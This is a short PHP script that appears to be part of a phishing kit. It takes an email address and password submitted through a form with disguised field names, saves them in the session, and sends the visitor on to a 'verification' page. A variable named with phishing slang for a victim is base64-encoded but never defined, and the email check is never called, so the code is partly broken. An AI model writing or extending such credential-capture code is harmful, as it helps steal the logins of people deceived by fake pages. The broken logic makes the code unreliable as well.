<?php
ini_set("output_buffering",4096);
session_start();


$_SESSION['radio'] = $radio = $_POST['create'];

$_SESSION['donnee1'] = $email = $_POST['donnee1'];
$_SESSION['donnee2'] = $password = $_POST['donnee2'];


//Processing Data (Don't Touch)
function is_email($input) {
  $email_pattern = "/^([a-zA-Z0-9\-\_\.]{1,})+@+([a-zA-Z0-9\-\_\.]{1,})+\.+([a-z]{2,4})$/i";
  if(preg_match($email_pattern, $input)) return TRUE;

}



$encrypt=  base64_encode($Zboon);
header("Location: verification.php");



?>
